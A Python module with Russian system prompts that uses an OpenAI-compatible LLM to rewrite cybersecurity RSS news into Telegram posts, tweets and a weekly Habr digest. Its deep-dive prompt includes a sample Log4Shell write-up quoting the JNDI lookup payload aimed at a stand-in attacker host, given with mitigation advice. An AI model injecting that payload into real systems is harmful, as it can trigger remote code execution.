"""
llm_service.py — Взаимодействие с LLM API (DeepSeek / OpenAI-совместимый).

DeepSeek полностью совместим с OpenAI Python SDK через параметр base_url.
Генерирует два формата контента из сырого RSS-текста:
  • ai_text   — полноформатный пост для Telegram/VK (до 950 символов)
               с сохранением технической терминологии (CVE, RCE, APT и т.д.)
  • ai_short  — сверхкраткая версия для X/Threads (до 240 символов)

Отдельный метод для еженедельного Markdown-дайджеста (Шаг 5).
"""

import asyncio
from typing import Optional

from openai import AsyncOpenAI, APIError, RateLimitError, APITimeoutError

from config import cfg
from logger import log

# ---------------------------------------------------------------------------
# Системные промпты
# ---------------------------------------------------------------------------

_SYSTEM_CYBERSEC = """
Ты — ведущий аналитик ИБ и автор Telegram-канала о кибербезопасности.
Превращай сырую новость в живой, профессиональный пост-алерт.

🚨 ФИЛЬТР:
Пропускай если новость о: уязвимостях (CVE, патчи, 0-day, эксплуатация), взломах и утечках данных,
APT-атаках и хакерских группах (Россия, Китай, Иран, КНДР), ransomware/малварях,
инцидентах (DDoS, компрометация роутеров/IoT, supply chain), арестах и приговорах хакеров.
Если новость — реклама продукта, маркетинговый отчёт или нет связи с ИБ — верни ТОЛЬКО одно слово: SKIP

СТИЛЬ:
- Пиши живо и конкретно, без воды и шаблонных фраз
- HTML: <b>жирный</b> для ключевых фактов, <code>код</code> для CVE/команд/версий
- Первая строка — заголовок с эмодзи, сразу отражает суть
- Технические термины на английском: CVE, RCE, APT, IoC, CVSS, TTPs, PoC
- Остальное — на русском. Максимум 750 символов.

ФОРМАТ — выбирай подходящий для типа новости:

[УЯЗВИМОСТЬ] ⚡️ <b>Продукт: суть уязвимости</b>
Кто под угрозой, CVSS, эксплуатируется ли.
• Вектор атаки и последствия (RCE/LPE/etc)
• Затронутые версии
🛡 Обновись до X.X / патч от вендора

[ВЗЛОМ/УТЕЧКА] 🔓 <b>Название: что произошло</b>
Масштаб — сколько пользователей/записей, когда обнаружено.
• Что скомпрометировано (пароли / карты / персданные)
• Как произошло (если известно)
💡 Что делать пострадавшим

[APT/МАЛВАРЬ] 🕵️ <b>Группа атакует цель</b>
Кто, кого, с какой целью.
• Инструменты, TTPs, вектор заражения
• Кто в зоне риска, IoC (если есть)

[АРЕСТ/СУД] 👮 <b>Задержан: за что</b>
Кто задержан, где, масштаб ущерба.
• Статьи обвинения и возможный срок

[ИНЦИДЕНТ] 🌐 <b>Сервис/инфра: что атакуют</b>
Масштаб атаки, кто стоит за ней.
• Последствия и текущий статус
• Меры защиты

Используй только те секции, которые уместны для конкретной новости.
НЕ копируй шаблон целиком — адаптируй под содержание.
"""

_SYSTEM_DEEP_DIVE = """
Ты — ведущий аналитик ИБ и автор Telegram-канала для IT-специалистов и крипто-аналитиков.
Напиши пост-анализ (Deep Dive) строго по образцу ниже. Никаких пояснений, меток, скобок или отступлений от формата.

ОБРАЗЕЦ ПОСТА (это пример структуры — напиши по аналогии для своей новости):

🔍 <b>Log4Shell: критическая RCE в Apache Log4j затрагивает миллионы серверов</b>

BleepingComputer сообщает об активной эксплуатации уязвимости <code>CVE-2021-44228</code> в библиотеке <b>Apache Log4j</b>, используемой в тысячах Java-приложений. Технически это одна из самых опасных RCE-уязвимостей за последнее десятилетие.

Технические детали:
Уязвимость в механизме JNDI lookup позволяет атакующему отправить строку вида <code>${jndi:ldap://attacker.com/a}</code>. Log4j автоматически делает LDAP-запрос и выполняет полученный Java-класс с правами процесса. Уязвимы версии <code>log4j-core &lt; 2.15.0</code>.

Главная инновация:
Атака эксплуатирует легитимную функцию логирования. Любое приложение, которое логирует пользовательский ввод — HTTP-заголовки, User-Agent, поля форм — автоматически уязвимо. Это делает массовую эксплуатацию тривиальной.

Последствия для рынка:
Затронуты облачные среды AWS, Azure, GCP, продукты VMware и Cisco. Тысячи CI/CD-пайплайнов и корпоративных Java-бэкендов под угрозой RCE без аутентификации.

Рекомендации: обнови <code>log4j-core</code> до 2.17.1+; выстави JVM-флаг <code>-Dlog4j2.formatMsgNoLookups=true</code>; заблокируй исходящие LDAP/RMI на фаерволе.

ПРАВИЛА ДЛЯ ТВОЕГО ПОСТА:
- Первая строка: эмодзи 🔍 + <b>Название: краткая суть</b> — строго в одну строку, без точки в конце
- Затем пустая строка
- Затем вводный абзац (источник + описание + оценка) — без каких-либо меток
- Затем пустая строка
- Затем разделы: "Технические детали:", "Главная инновация:", "Последствия для рынка:", "Рекомендации:" — именно эти названия
- НЕ выводи слова [Заголовок], [Вводный абзац], [Пустая строка] или любые другие метки в скобках
- Используй <b>жирный</b> для ключевых сущностей и <code>код</code> для технических идентификаторов
- Объём: 800–1500 символов
"""

_SYSTEM_SHORT = """Ты — технический копирайтер для X (Twitter).
Сжимай новость кибербезопасности в ультра-емкий твит.

ПРАВИЛА:
- Никакой "воды". Сразу суть: что сломали и как защититься.
- Пиши на русском. Термины (CVE, RCE и т.д.) оставляй на английском.
- Добавь 1-2 хэштега (#cybersecurity #infosec) в конце.
- Максимальный объем: 220 символов, чтобы влезло вместе с ссылкой."""

_SYSTEM_DIGEST = """Ты — технический редактор раздела "Информационная безопасность" на Хабре.
Задача: составить еженедельный дайджест из списка новостей.

ПРАВИЛА:
1. Группируй новости по категориям: Уязвимости и патчи | APT и кампании | Утечки данных | Инструменты и исследования.
2. Для каждой новости: заголовок → 2-3 предложения технического описания → ссылка.
3. Сохраняй CVE-номера, CVSS-оценки, технические аббревиатуры.
4. Формат: Markdown, пригодный для публикации на Хабре.
5. В начале — краткое вступление (3-4 предложения о трендах недели)."""

# ---------------------------------------------------------------------------
# Клиент
# ---------------------------------------------------------------------------

_client: Optional[AsyncOpenAI] = None


def _get_client() -> AsyncOpenAI:
    """Ленивая инициализация AsyncOpenAI-совместимого клиента (DeepSeek или OpenAI)."""
    global _client
    if _client is None:
        _client = AsyncOpenAI(
            api_key=cfg.llm_api_key,
            base_url=cfg.llm_base_url,   # DeepSeek: https://api.deepseek.com
            timeout=90.0,                # DeepSeek чуть медленнее OpenAI
            max_retries=2,
        )
        log.info("🔌 LLM клиент: {} ({})", cfg.llm_model, cfg.llm_base_url)
    return _client


# ---------------------------------------------------------------------------
# Приватные хелперы
# ---------------------------------------------------------------------------

async def _chat(
    system: str,
    user_prompt: str,
    max_tokens: int = 600,
    temperature: float = 0.4,
) -> Optional[str]:
    """
    Выполняет запрос к ChatCompletion.
    Возвращает текст ответа или None при ошибке.
    """
    client = _get_client()
    try:
        response = await client.chat.completions.create(
            model=cfg.llm_model,
            messages=[
                {"role": "system", "content": system},
                {"role": "user",   "content": user_prompt},
            ],
            max_tokens=max_tokens,
            temperature=temperature,
        )
        text = response.choices[0].message.content
        if text:
            return text.strip()
        log.warning("⚠️  OpenAI вернул пустой ответ")
        return None

    except RateLimitError:
        log.error("🚫 OpenAI Rate Limit превышен — повторная попытка через 60 сек.")
        await asyncio.sleep(60)
        return None
    except APITimeoutError:
        log.error("⏱️  OpenAI Timeout")
        return None
    except APIError as exc:
        log.error("❌ OpenAI APIError: {}", exc)
        return None
    except Exception as exc:
        log.exception("💥 Неожиданная ошибка при запросе к OpenAI: {}", exc)
        return None


# ---------------------------------------------------------------------------
# Публичный API
# ---------------------------------------------------------------------------

async def generate_post(
    title: str,
    raw_text: str,
    url: str,
    source: str,
) -> tuple[Optional[str], Optional[str], Optional[str]]:
    """
    Генерирует (ai_text, ai_short, ai_text_deep) для одной новости.

    Args:
        title:    Заголовок из RSS
        raw_text: Краткое описание/summary из RSS
        url:      Оригинальный URL статьи
        source:   Название источника (BleepingComputer и т.д.)

    Returns:
        (ai_text, ai_short, ai_text_deep) — все могут быть None при ошибке API
    """
    user_prompt = (
        f"Источник: {source}\n"
        f"Заголовок: {title}\n"
        f"Текст: {raw_text}\n"
        f"URL: {url}\n\n"
        f"Напиши адаптированный пост для Telegram-канала по кибербезопасности."
    )

    short_prompt = (
        f"Заголовок: {title}\n"
        f"Краткое описание: {raw_text[:400]}\n\n"
        f"Напиши твит для X (до 240 символов)."
    )

    log.info("🤖 Генерация постов для: {}", title[:70])

    # Запускаем все три запроса параллельно
    ai_text, ai_short, ai_text_deep = await asyncio.gather(
        _chat(_SYSTEM_CYBERSEC,  user_prompt, max_tokens=420, temperature=0.35),
        _chat(_SYSTEM_SHORT,     short_prompt, max_tokens=100, temperature=0.2),
        _chat(_SYSTEM_DEEP_DIVE, user_prompt, max_tokens=1000, temperature=0.35),
    )

    # Обрезка по лимитам на случай если модель всё же превысила
    # Не режем жестко ai_text/ai_text_deep на 950 символов, чтобы не ломать HTML-теги. Позволяем умеренные превышения.
    if ai_text and len(ai_text) > 4000:
        ai_text = ai_text[:3997] + "..."
    if ai_short and len(ai_short) > 250:
        ai_short = ai_short[:247] + "..."
    if ai_text_deep and len(ai_text_deep) > 4000:
        ai_text_deep = ai_text_deep[:3997] + "..."

    if ai_text:
        log.info("✅ ai_text сгенерирован ({} симв.)", len(ai_text))
    if ai_short:
        log.info("✅ ai_short сгенерирован ({} симв.)", len(ai_short))
    if ai_text_deep:
        log.info("✅ ai_text_deep сгенерирован ({} симв.)", len(ai_text_deep))

    return ai_text, ai_short, ai_text_deep


async def generate_deep_dive_only(
    title: str,
    raw_text: str,
    url: str,
    source: str,
) -> Optional[str]:
    """
    Генерирует ТОЛЬКО Deep Dive формат для статьи (для ленивой генерации старых новостей).
    """
    user_prompt = (
        f"Источник: {source}\n"
        f"Заголовок: {title}\n"
        f"Текст: {raw_text}\n"
        f"URL: {url}\n\n"
        f"Напиши технический глубокий разбор (Deep Dive) для Telegram-канала."
    )

    log.info("🤖 Ленивая генерация Deep Dive для: {}", title[:70])
    ai_text_deep = await _chat(_SYSTEM_DEEP_DIVE, user_prompt, max_tokens=1000, temperature=0.35)

    if ai_text_deep and len(ai_text_deep) > 4000:
        ai_text_deep = ai_text_deep[:3997] + "..."

    return ai_text_deep


async def generate_weekly_digest(news_rows: list) -> Optional[str]:
    """
    Генерирует Markdown-дайджест для Хабра из списка опубликованных новостей за неделю.

    Args:
        news_rows: Список sqlite3.Row объектов с полями title, ai_text, url

    Returns:
        Markdown-строка или None при ошибке
    """
    if not news_rows:
        log.warning("📭 Нет новостей для дайджеста")
        return None

    # Формируем список для промпта
    items = []
    for row in news_rows:
        items.append(
            f"- Заголовок: {row['title']}\n"
            f"  Текст: {(row['ai_text'] or row['raw_text'] or '')[:300]}\n"
            f"  URL: {row['url']}"
        )
    news_block = "\n\n".join(items)

    user_prompt = (
        f"Составь еженедельный дайджест кибербезопасности из следующих {len(news_rows)} новостей:\n\n"
        f"{news_block}\n\n"
        f"Формат: Markdown для Хабра."
    )

    log.info("📝 Генерация недельного дайджеста из {} новостей...", len(news_rows))
    digest = await _chat(_SYSTEM_DIGEST, user_prompt, max_tokens=2500, temperature=0.3)

    if digest:
        log.info("✅ Дайджест сгенерирован ({} симв.)", len(digest))
    else:
        log.error("❌ Не удалось сгенерировать дайджест")

    return digest
